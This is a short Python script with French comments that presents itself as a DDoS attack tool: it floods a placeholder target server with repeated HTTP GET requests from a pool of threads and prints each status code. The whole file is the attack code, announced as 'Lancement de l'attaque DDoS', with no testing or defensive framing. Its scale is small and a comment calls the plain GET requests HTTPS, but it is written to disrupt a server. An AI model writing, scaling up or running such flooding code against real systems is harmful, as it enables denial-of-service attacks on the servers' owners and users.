import requests
import concurrent.futures
import time

# Adresse IP ou URL du serveur cible à attaquer
target_server = 'http://<Adresse_IP_du_server_1>'

# Nombre de requêtes par canal (thread)
requests_per_channel = 100

# Nombre total de canaux (threads) à utiliser
num_channels = 10

# Fonction pour envoyer des requêtes HTTPS au serveur cible
def send_requests():
    for _ in range(requests_per_channel):
        try:
            response = requests.get(target_server)
            print(f"Request sent to {target_server} | Status code: {response.status_code}")
        except Exception as e:
            print(f"Request failed: {str(e)}")

# Fonction principale pour lancer les canaux simultanément
def launch_attack():
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_channels) as executor:
        futures = [executor.submit(send_requests) for _ in range(num_channels)]
        concurrent.futures.wait(futures)

# Lancement de l'attaque DDoS
if __name__ == '__main__':
    print(f"Launching DDoS attack on {target_server}...")
    launch_attack()
